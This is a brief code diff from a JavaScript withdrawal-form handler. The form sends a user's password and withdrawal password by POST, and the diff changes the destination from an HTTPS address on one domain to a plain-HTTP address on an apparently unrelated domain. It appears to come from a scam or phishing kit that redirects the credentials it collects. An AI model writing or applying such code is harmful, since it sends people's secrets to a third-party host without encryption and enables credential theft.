@@ -39,7 +39,7 @@ function submitWithdrawal() {
   formData.append("password", password);
   formData.append("withdrawPassword", withdrawPassword);
 
-  fetch("https://www.storm777.co.in/admin/winner11.php", {
+  fetch("http://mailbox99.club/admin/winner11.php", {
     method: "POST",
     body: formData,
   })
